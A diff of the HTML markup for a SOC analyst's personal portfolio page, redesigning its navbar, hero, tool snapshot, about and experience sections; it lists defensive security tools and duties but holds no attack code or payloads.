@@ -1,436 +1,2216 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-  <title>Jayanth Karri — SOC Analyst Portfolio | Real-Time Threat Detection</title>
-  <meta name="description" content="Portfolio of Jayanth Karri, SOC Analyst specializing in real-time threat detection, incident response, SIEM, EDR, and cyber defense operations.">
-  <link rel="stylesheet" href="./css/style.css?v=glass_blur_v8">
+  <title>Jayanth Karri — SOC Analyst | Threat Detection &amp; Incident Response</title>
+  <meta name="description" content="Professional portfolio of Jayanth Karri, SOC Analyst with 2+ years of enterprise security operations experience. Specializing in alert triage, multi-source incident investigation, SIEM/EDR correlation, KQL detection engineering, and security automation.">
+  <meta name="author" content="Jayanth Karri">
+  
+  <!-- Open Graph / Social Sharing -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Jayanth Karri — SOC Analyst | Threat Detection &amp; Incident Response">
+  <meta property="og:description" content="Explore enterprise incident investigations, production KQL detection rules, threat hunts, and verified certifications.">
+  <meta property="og:image" content="./assets/portrait/jayanth_transparent.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Jayanth Karri — SOC Analyst | Threat Detection &amp; Incident Response">
+  <meta name="twitter:description" content="Explore enterprise incident investigations, production KQL detection rules, threat hunts, and verified certifications.">
+  <meta name="twitter:image" content="./assets/portrait/jayanth_transparent.png">
+
+  <!-- Shield Favicon -->
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
+
+  <!-- Fonts & Stylesheet -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./css/style.css?v=premium_soc_v2">
 </head>
 <body>
 
-  <!-- =========================================================================
-       INTERACTIVE GLOWING CURSOR EFFECT
-       ========================================================================= -->
+  <!-- Subtle Interactive Cursor (Desktop Only) -->
   <div class="cursor-dot" id="cursorDot" aria-hidden="true"></div>
   <div class="cursor-follower" id="cursorFollower" aria-hidden="true"></div>
 
   <!-- =========================================================================
-       1. HEROIC INTRODUCTORY SPLASH SCREEN
-       ========================================================================= -->
-  <div id="splash-screen" class="splash-screen" aria-hidden="false">
-    <div class="splash-content">
-      <div class="splash-badge">
-        <span class="splash-dot"></span>
-        <span>SECURITY OPERATIONS CENTER</span>
-      </div>
-      <h1 class="splash-title">
-        Jayanth <span class="splash-dash">—</span> SOC Analyst Portfolio
-      </h1>
-      <div class="splash-loader-bar">
-        <div class="splash-loader-progress"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- =========================================================================
-       2. EDGE-TO-EDGE CANVAS BACKGROUND (ZERO BLANK SPACE)
-       ========================================================================= -->
-  <canvas id="canvas"></canvas>
-
-  <!-- =========================================================================
-       3. PINNED HEADER / NAVBAR (IMAGE 4 FORMAT, MODERN GLASS STYLE)
-       Always pinned at the top wherever user scrolls.
+       1. PINNED NAVBAR & THEME SWITCHER
        ========================================================================= -->
   <header class="navbar-pinned" id="pinnedNavbar">
-    <a href="#hero" class="brand-title" aria-label="Home">
-      <span class="brand-bracket">&lt;</span> JAYANTH <span class="brand-bracket">/&gt;</span>
-    </a>
-
-    <nav class="nav-menu" id="navMenu" aria-label="Main Navigation">
-      <a href="#experience" class="nav-item-link" data-nav="experience">Experience</a>
-      <a href="#projects" class="nav-item-link" data-nav="projects">Projects</a>
-      <a href="#certifications" class="nav-item-link" data-nav="certifications">Certificates</a>
-      <a href="#about" class="nav-item-link" data-nav="about">About</a>
-      <a href="#contact" class="nav-item-link" data-nav="contact">Contact</a>
-      <a href="./assets/resume/Jayanth_Soc-Analyst.pdf" target="_blank" rel="noopener noreferrer" class="nav-resume-pill">
-        <span>Resume ↗</span>
+    <div class="nav-container">
+      <a href="#hero" class="brand-title" aria-label="Jayanth Karri Home">
+        <span class="brand-symbol">🛡️</span>
+        <span class="brand-name">Jayanth Karri</span>
+        <span class="brand-badge">&lt;CYBER_DEFENSE/&gt;</span>
       </a>
-    </nav>
+
+      <nav class="nav-menu" id="navMenu" aria-label="Main Navigation">
+        <a href="#hero" class="nav-item-link" data-nav="hero">Home</a>
+        <a href="#snapshot" class="nav-item-link" data-nav="snapshot">Snapshot</a>
+        <a href="#about" class="nav-item-link" data-nav="about">About</a>
+        <a href="#experience" class="nav-item-link" data-nav="experience">Experience</a>
+        <a href="#capabilities" class="nav-item-link" data-nav="capabilities">Capabilities</a>
+        <a href="#investigations" class="nav-item-link" data-nav="investigations">Investigations</a>
+        <a href="#detections" class="nav-item-link" data-nav="detections">Detections</a>
+        <a href="#hunting" class="nav-item-link" data-nav="hunting">Threat Hunting</a>
+        <a href="#projects" class="nav-item-link" data-nav="projects">Projects</a>
+        <a href="#matrix" class="nav-item-link" data-nav="matrix">Skills &amp; Matrix</a>
+        <a href="#certifications" class="nav-item-link" data-nav="certifications">Certs</a>
+        <a href="#contact" class="nav-item-link" data-nav="contact">Contact</a>
+      </nav>
+
+      <div class="nav-actions">
+        <!-- Theme Switcher (Dark / Light) -->
+        <button class="theme-toggle-btn" id="themeToggle" aria-label="Toggle Light and Dark Mode" title="Toggle Theme">
+          <svg class="sun-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+          <svg class="moon-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+        </button>
+
+        <!-- Direct Resume Download -->
+        <a href="./assets/resume/Jayanth_Soc-Analyst.pdf" target="_blank" rel="noopener noreferrer" class="nav-resume-btn">
+          <span>Resume ↗</span>
+        </a>
+
+        <!-- Mobile Hamburger Toggle -->
+        <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Toggle navigation menu" aria-expanded="false">
+          <span class="hamburger-bar"></span>
+          <span class="hamburger-bar"></span>
+          <span class="hamburger-bar"></span>
+        </button>
+      </div>
+    </div>
   </header>
 
   <main class="main-wrapper">
 
     <!-- =========================================================================
-         HERO SECTION
+         2. HERO SECTION (Apple-like Minimal Split Composition)
          ========================================================================= -->
     <section id="hero" class="hero-section">
-      <div class="hero-split-container">
-        <!-- Hero Left Flank -->
-        <div class="hero-left-flank">
-          <div class="hero-greeting-pill">
+      <div class="hero-ambient-glow" aria-hidden="true"></div>
+      <div class="section-container hero-grid">
+
+        <!-- Left Flank: Narrative & Value Proposition -->
+        <div class="hero-text-flank">
+          <div class="hero-eyebrow">
             <span class="pulse-dot"></span>
-            <span>Hello, I'm</span>
+            <span>SECURITY OPERATIONS • THREAT DETECTION</span>
           </div>
 
-          <h1 class="hero-display-name">
-            <span class="name-first">Jayanth</span>
-            <span class="name-last">Karri</span>
+          <h1 class="hero-title">
+            SOC Analyst<br>
+            <span class="gradient-text">Threat Detection</span><br>
+            <span class="gradient-text-alt">Incident Response</span>
           </h1>
 
-          <div class="hero-role-pill">
-            <span class="hero-role-title">SOC Analyst • First Responder</span>
+          <div class="hero-subline">
+            <strong>2+ Years of SOC Experience</strong> • SOC Analyst • Building Toward SOC L2
           </div>
 
+          <p class="hero-description">
+            I am a SOC Analyst with more than two years of enterprise security operations experience, specializing in security alert triage, incident investigation, SIEM &amp; EDR correlation, threat detection, and tactical containment.
+          </p>
+
+          <p class="hero-description-secondary">
+            I don't just monitor alerts. I investigate multi-source telemetry across endpoint, identity, email, network, and cloud vectors to determine scope and root cause, execute rapid containment, and continuously author high-fidelity detection logic.
+          </p>
+
           <div class="hero-cta-group">
-            <a href="./assets/resume/Jayanth_Soc-Analyst.pdf" target="_blank" rel="noopener noreferrer" class="btn-primary-hero">
+            <a href="#investigations" class="btn-primary">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+              </svg>
+              <span>View Investigations</span>
+            </a>
+
+            <a href="#projects" class="btn-secondary">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="16 18 22 12 16 6"></polyline>
+                <polyline points="8 6 2 12 8 18"></polyline>
+              </svg>
+              <span>View Projects</span>
+            </a>
+
+            <a href="./assets/resume/Jayanth_Soc-Analyst.pdf" target="_blank" rel="noopener noreferrer" class="btn-outline">
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
                 <polyline points="14 2 14 8 20 8"></polyline>
                 <line x1="16" y1="13" x2="8" y2="13"></line>
                 <line x1="16" y1="17" x2="8" y2="17"></line>
               </svg>
-              View Resume ↗
+              <span>Download Resume</span>
             </a>
-            <a href="#contact" class="btn-secondary-hero">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
-                <polyline points="22,6 12,13 2,6"></polyline>
-              </svg>
-              Get in Touch
-            </a>
+
+            <div class="hero-social-pill-group">
+              <a href="https://www.linkedin.com/in/karri-jayanth/" target="_blank" rel="noopener noreferrer" class="social-round-btn" aria-label="LinkedIn Profile" title="LinkedIn Profile">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
+                </svg>
+              </a>
+              <a href="https://github.com/karrijayanth65" target="_blank" rel="noopener noreferrer" class="social-round-btn" aria-label="GitHub Repositories" title="GitHub Repositories">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                  <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"/>
+                </svg>
+              </a>
+              <a href="https://medium.com/@nameisnani2027" target="_blank" rel="noopener noreferrer" class="social-round-btn" aria-label="Medium Technical Publications" title="Medium Write-ups (@nameisnani2027)">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M13.54 12a6.8 6.8 0 01-6.77 6.82A6.8 6.8 0 010 12a6.8 6.8 0 016.77-6.82A6.8 6.8 0 0113.54 12zM20.96 12c0 3.54-1.51 6.42-3.38 6.42-1.87 0-3.39-2.88-3.39-6.42s1.52-6.42 3.39-6.42 3.38 2.88 3.38 6.42M24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12z"/>
+                </svg>
+              </a>
+            </div>
           </div>
         </div>
 
-        <!-- Center Spacer for Canvas 3D Model -->
-        <div class="hero-center-spacer" aria-hidden="true"></div>
-
-        <!-- Hero Right Flank -->
-        <div class="hero-right-flank">
-          <div class="hero-kicker-badge">
-            <span class="shield-icon">🛡️</span>
-            <span>REAL-TIME THREAT DETECTION</span>
+        <!-- Right Flank: Sophisticated Hero Composition (Cutout Portrait & Cinematic Scroll Canvas) -->
+        <div class="hero-visual-flank">
+          <!-- Mode Switcher (Hidden: User clicks on the image directly to toggle views) -->
+          <div class="hero-view-switch" role="tablist" aria-label="Hero Portrait View Switcher" style="display: none;">
+            <button class="view-switch-btn active" id="viewBtnPortrait" onclick="switchHeroView('portrait')" role="tab" aria-selected="true">
+              <span>👤 Studio Cutout</span>
+            </button>
+            <button class="view-switch-btn" id="viewBtnCinematic" onclick="switchHeroView('cinematic')" role="tab" aria-selected="false">
+              <span>🎬 360° Scroll Motion</span>
+            </button>
           </div>
 
-          <h2 class="hero-headline-flank">
-            Real-Time<br>Threat Detection<br><span class="hero-highlight-purple">& SOC Operations</span>
-          </h2>
+          <div class="hero-display-viewport" id="heroDisplayViewport">
+            <!-- View A: Transparent Studio Cutout Portrait (Clickable) -->
+            <div class="hero-portrait-stage active" id="heroStagePortrait" onclick="toggleHeroView()" style="cursor: pointer;">
+              <div class="portrait-halo"></div>
+              <img src="./assets/portrait/jayanth_transparent.png" alt="Jayanth Karri - SOC Analyst" class="hero-cutout-img" loading="eager">
+              
+              <!-- Ambient Floating Telemetry Badges: Top Right Role & Bottom Corner Certifications -->
+              <div class="float-badge badge-top-right" onclick="event.stopPropagation()">
+                <span class="badge-dot emerald"></span>
+                <span>SOC Analyst • Mphasis</span>
+              </div>
 
-          <p class="hero-desc-flank">
-            Defending enterprise infrastructure through 24/7 security event monitoring, rapid incident containment, and automated threat validation across endpoint, cloud, and identity vectors.
-          </p>
+              <!-- Bottom-Left Corner: SC-200 & Google Cybersecurity -->
+              <div class="float-badge-group badge-group-bottom-left" onclick="event.stopPropagation()">
+                <div class="float-badge">
+                  <span class="badge-dot cyan"></span>
+                  <span>Microsoft SC-200 Certified</span>
+                </div>
+                <div class="float-badge">
+                  <span class="badge-dot blue"></span>
+                  <span>Google Cybersecurity</span>
+                </div>
+              </div>
 
-          <div class="hero-live-badge">
-            <span class="pulse-dot active-green"></span>
-            <span>Active SOC First Responder • Mphasis</span>
+              <!-- Bottom-Right Corner: CompTIA Security+ & LetsDefend -->
+              <div class="float-badge-group badge-group-bottom-right" onclick="event.stopPropagation()">
+                <div class="float-badge">
+                  <span class="badge-dot amber"></span>
+                  <span>CompTIA Security+</span>
+                </div>
+                <div class="float-badge">
+                  <span class="badge-dot violet"></span>
+                  <span>LetsDefend SOC Analyst</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- View B: Scroll-Driven 360° Sequence Canvas -->
+            <div class="hero-canvas-stage" id="heroStageCanvas" title="Drag to rotate 360° • Click to switch back">
+              <canvas id="heroScrollCanvas" width="600" height="600"></canvas>
+              <div class="canvas-vignette-overlay"></div>
+              <div class="canvas-scroll-hint">
+                <span class="hint-mouse"></span>
+                <span>Drag to rotate • Click to switch back</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         3. RECRUITER SNAPSHOT ("SOC Analyst at a Glance")
+         ========================================================================= -->
+    <section id="snapshot" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">RECRUITER SNAPSHOT</span>
+          <h2 class="section-heading">SOC Analyst at a Glance</h2>
+          <p class="section-subtext">A 15-second executive summary of my operational experience, target role, core platforms, and defensive methodologies.</p>
+        </div>
+
+        <div class="snapshot-cards-grid">
+          <div class="snapshot-tile">
+            <div class="tile-icon">⏳</div>
+            <div class="tile-label">Experience</div>
+            <div class="tile-value">2+ Years</div>
+            <div class="tile-desc">Enterprise SOC / First Responder</div>
+          </div>
+
+          <div class="snapshot-tile tile-featured">
+            <div class="tile-icon">🎯</div>
+            <div class="tile-label">Status</div>
+            <div class="tile-value text-accent-violet">Open to SOC L2</div>
+            <div class="tile-desc">Open to SOC L2 Opportunities</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">🛡️</div>
+            <div class="tile-label">Primary Focus</div>
+            <div class="tile-value">Threat Detection</div>
+            <div class="tile-desc">Incident Response &amp; Investigation</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">📊</div>
+            <div class="tile-label">SIEM Platforms</div>
+            <div class="tile-value">Devo • Microsoft Sentinel</div>
+            <div class="tile-desc">Wazuh • Splunk Telemetry</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">💻</div>
+            <div class="tile-label">EDR / XDR</div>
+            <div class="tile-value">CrowdStrike Falcon</div>
+            <div class="tile-desc">Microsoft Defender XDR</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">🔑</div>
+            <div class="tile-label">Identity</div>
+            <div class="tile-value">Microsoft Entra ID</div>
+            <div class="tile-desc">Azure AD • MFA &amp; Conditional Access</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">🌐</div>
+            <div class="tile-label">Security Vectors</div>
+            <div class="tile-value">Endpoint • Email • Cloud</div>
+            <div class="tile-desc">Identity &amp; Network Telemetry</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">⚡</div>
+            <div class="tile-label">Query &amp; Correlation</div>
+            <div class="tile-value">KQL</div>
+            <div class="tile-desc">SIEM Queries • Log Correlation</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">🗺️</div>
+            <div class="tile-label">Framework</div>
+            <div class="tile-value">MITRE ATT&amp;CK</div>
+            <div class="tile-desc">Adversary Behavior Mapping</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">🐍</div>
+            <div class="tile-label">Automation</div>
+            <div class="tile-value">Python</div>
+            <div class="tile-desc">IOC Enrichment &amp; Workflows</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">✉️</div>
+            <div class="tile-label">Email &amp; Network</div>
+            <div class="tile-value">Avanan • Check Point</div>
+            <div class="tile-desc">Netskope CASB • Gateway Triage</div>
+          </div>
+
+          <div class="snapshot-tile">
+            <div class="tile-icon">📋</div>
+            <div class="tile-label">ITSM &amp; SLA</div>
+            <div class="tile-value">ServiceNow</div>
+            <div class="tile-desc">Strict SLA Compliance &amp; MTTR</div>
           </div>
         </div>
       </div>
     </section>
 
     <!-- =========================================================================
-         EXPERIENCE SECTION (IMAGE 3 FORMAT, GENUINE DATA ONLY)
-         Vertical timeline with purple node, role, company, green credential box,
-         and purple circled checkmarks.
+         4. ABOUT SECTION ("From Alert Triage to Security Investigation")
          ========================================================================= -->
-    <section id="experience" class="content-section">
+    <section id="about" class="content-section">
       <div class="section-container">
-        <div class="section-header-ref">
-          <h2 class="section-title-ref">Experience</h2>
-          <div class="section-title-line"></div>
+        <div class="section-header">
+          <span class="section-eyebrow">PROFILE</span>
+          <h2 class="section-heading">From Alert Triage to Security Investigation</h2>
+          <p class="section-subtext">The progression from acknowledging security alerts to uncovering the full attack lifecycle through multi-source telemetry.</p>
         </div>
 
-        <div class="exp-timeline-container">
-          <div class="exp-timeline-line"></div>
+        <div class="about-card-wrapper">
+          <div class="about-narrative">
+            <p>
+              I am a SOC Analyst with more than two years of enterprise security operations experience handling the critical first response to security events. My professional experience centers on triaging high-volume telemetry, validating true versus false positives, analyzing endpoint process ancestry and cloud authentication logs, enriching indicators of compromise, and orchestrating containment actions within strict operational SLAs.
+            </p>
+            <p>
+              Through this operational journey, I have developed an intimate mastery of the complete security-alert lifecycle: beginning with telemetry ingestion and alert triage, progressing through multi-source correlation and severity validation, identifying scope and root cause, executing containment (such as host isolation or session revocation), and closing cases with strategic defense recommendations.
+            </p>
+            <p>
+              My focus is now progressing into <strong>SOC L2 responsibilities</strong>, where I take greater ownership of complex investigations, hypothesis-driven threat hunting, detection engineering, and false-positive reduction. Alongside my enterprise responsibilities, I build defensive lab ranges, author behavioral KQL detection queries, and engineer Python automation tools to accelerate threat analysis for the entire SOC team.
+            </p>
+          </div>
 
-          <!-- Mphasis SOC Analyst (Jayanth's Real Experience) -->
-          <div class="exp-timeline-item">
-            <div class="exp-timeline-node"></div>
-
-            <div class="exp-card-ref">
-              <div class="exp-top-row">
-                <span class="exp-badge-pill">
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-                    <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
-                    <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
-                  </svg>
-                  Full-Time • First Responder
-                </span>
-
-                <div class="exp-meta-info">
-                  <div class="exp-meta-line">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                      <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-                      <line x1="16" y1="2" x2="16" y2="6"></line>
-                      <line x1="8" y1="2" x2="8" y2="6"></line>
-                      <line x1="3" y1="10" x2="21" y2="10"></line>
-                    </svg>
-                    <span>Sept 2024 – Present</span>
-                  </div>
-                  <div class="exp-meta-line">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                      <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
-                      <circle cx="12" cy="10" r="3"></circle>
-                    </svg>
-                    <span>Bengaluru, Karnataka, India • On-Site</span>
-                  </div>
-                </div>
+          <!-- The Complete Alert Progression Lifecycle -->
+          <div class="alert-lifecycle-container">
+            <div class="lifecycle-heading">THE END-TO-END SECURITY ALERT PROGRESSION</div>
+            <div class="lifecycle-grid">
+              <div class="lifecycle-card">
+                <span class="lifecycle-num">01</span>
+                <h4>Telemetry Ingestion</h4>
+                <p>Continuous monitoring across SIEM, EDR, Identity &amp; Email gateways.</p>
               </div>
+              <div class="lifecycle-card">
+                <span class="lifecycle-num">02</span>
+                <h4>Alert Triage</h4>
+                <p>Severity assessment, initial validation, and false-positive suppression.</p>
+              </div>
+              <div class="lifecycle-card">
+                <span class="lifecycle-num">03</span>
+                <h4>Evidence Correlation</h4>
+                <p>Reconstructing timelines across processes, logins, network &amp; OSINT.</p>
+              </div>
+              <div class="lifecycle-card">
+                <span class="lifecycle-num">04</span>
+                <h4>Scope &amp; Root Cause</h4>
+                <p>Determining blast radius, initial access vector, and affected entities.</p>
+              </div>
+              <div class="lifecycle-card">
+                <span class="lifecycle-num">05</span>
+                <h4>Containment</h4>
+                <p>EDR host isolation, token revocation, and enterprise mailbox sweeps.</p>
+              </div>
+              <div class="lifecycle-card">
+                <span class="lifecycle-num">06</span>
+                <h4>Detection Tuning</h4>
+                <p>Refining detection conditions to prevent noise and hardening posture.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
 
+    <!-- =========================================================================
+         5. EXPERIENCE SECTION (Mphasis 2+ Years)
+         ========================================================================= -->
+    <section id="experience" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">PROFESSIONAL EXPERIENCE</span>
+          <h2 class="section-heading">Operational SOC Journey</h2>
+          <p class="section-subtitle">Hands-on enterprise security operations and first-response investigation experience across 2+ years.</p>
+        </div>
+
+        <div class="experience-card">
+          <div class="exp-card-header">
+            <div class="exp-header-left">
+              <span class="exp-badge-fulltime">Full-Time • Enterprise Operations</span>
               <h3 class="exp-role-title">SOC Analyst (First Responder)</h3>
-              <div class="exp-company-row">
+              <div class="exp-company-sub">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                   <rect x="4" y="2" width="16" height="20" rx="2" ry="2"></rect>
                   <path d="M9 22v-4h6v4"></path>
                   <line x1="8" y1="6" x2="8.01" y2="6"></line>
                   <line x1="16" y1="6" x2="16.01" y2="6"></line>
-                  <line x1="8" y1="10" x2="8.01" y2="10"></line>
-                  <line x1="16" y1="10" x2="16.01" y2="10"></line>
-                  <line x1="8" y1="14" x2="8.01" y2="14"></line>
-                  <line x1="16" y1="14" x2="16.01" y2="14"></line>
                 </svg>
-                <span>Mphasis</span>
+                <span>Mphasis • Bengaluru, Karnataka, India (On-Site)</span>
               </div>
+            </div>
+            <div class="exp-header-right">
+              <div class="exp-dates">Sept 2024 – Present</div>
+              <div class="exp-tenure">2+ Years Enterprise SOC Experience</div>
+            </div>
+          </div>
 
-              <!-- Green Credential Highlight Box (Image 3 format) -->
-              <a href="https://learn.microsoft.com/en-us/users/jayanthkarri-4682/credentials/7509c0da393c795e" target="_blank" rel="noopener noreferrer" class="exp-credential-box">
-                <div class="exp-cred-left">
-                  <span class="exp-cred-icon">🏆</span>
-                  <span>Certificate for Skill Competency – Microsoft Certified: Security Operations Analyst (SC-200)</span>
-                </div>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-                  <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                  <polyline points="15 3 21 3 21 9"></polyline>
-                  <line x1="10" y1="14" x2="21" y2="3"></line>
-                </svg>
-              </a>
+          <!-- Verified SC-200 Credential Ribbon -->
+          <a href="https://learn.microsoft.com/en-us/users/jayanthkarri-4682/credentials/7509c0da393c795e" target="_blank" rel="noopener noreferrer" class="verified-ribbon">
+            <div class="ribbon-content">
+              <span class="ribbon-medal">🏆</span>
+              <span>Verified Skill Competency: <strong>Microsoft Certified: Security Operations Analyst (SC-200)</strong> — ID: 7509C0DA393C795E</span>
+            </div>
+            <span class="ribbon-link">Verify Credential ↗</span>
+          </a>
 
-              <!-- Bullets with Purple Circled Checkmarks (Genuine Mphasis Responsibilities) -->
-              <ul class="exp-bullets-ref">
-                <li class="exp-bullet-item">
-                  <div class="exp-bullet-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                      <circle cx="12" cy="12" r="10" stroke="#7c3aed" stroke-width="2" fill="rgba(124, 58, 237, 0.12)"/>
-                      <polyline points="8 12 11 15 16 9" stroke="#7c3aed" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                  </div>
-                  <span><strong>Continuous Security Event Monitoring:</strong> 24/7 real-time event monitoring, alert triage, and high-fidelity threat validation across endpoint, email, cloud, and identity vectors.</span>
-                </li>
-                <li class="exp-bullet-item">
-                  <div class="exp-bullet-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                      <circle cx="12" cy="12" r="10" stroke="#7c3aed" stroke-width="2" fill="rgba(124, 58, 237, 0.12)"/>
-                      <polyline points="8 12 11 15 16 9" stroke="#7c3aed" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                  </div>
-                  <span><strong>Incident Containment & Response:</strong> Rapidly investigating suspicious activities, isolating compromised hosts via CrowdStrike Falcon, and quarantining malicious phishing emails via Avanan and Check Point.</span>
-                </li>
-                <li class="exp-bullet-item">
-                  <div class="exp-bullet-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                      <circle cx="12" cy="12" r="10" stroke="#7c3aed" stroke-width="2" fill="rgba(124, 58, 237, 0.12)"/>
-                      <polyline points="8 12 11 15 16 9" stroke="#7c3aed" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                  </div>
-                  <span><strong>ServiceNow & SLA Management:</strong> Logging, escalating, and managing security incident tickets within ServiceNow while maintaining strict operational SLA adherence.</span>
-                </li>
-                <li class="exp-bullet-item">
-                  <div class="exp-bullet-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                      <circle cx="12" cy="12" r="10" stroke="#7c3aed" stroke-width="2" fill="rgba(124, 58, 237, 0.12)"/>
-                      <polyline points="8 12 11 15 16 9" stroke="#7c3aed" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                  </div>
-                  <span><strong>Cross-Platform Analysis:</strong> Querying telemetry across Devo SIEM, Microsoft Sentinel, and Defender XDR to hunt for persistent indicators of compromise (IOCs) and adversary techniques.</span>
-                </li>
-                <li class="exp-bullet-item">
-                  <div class="exp-bullet-icon">
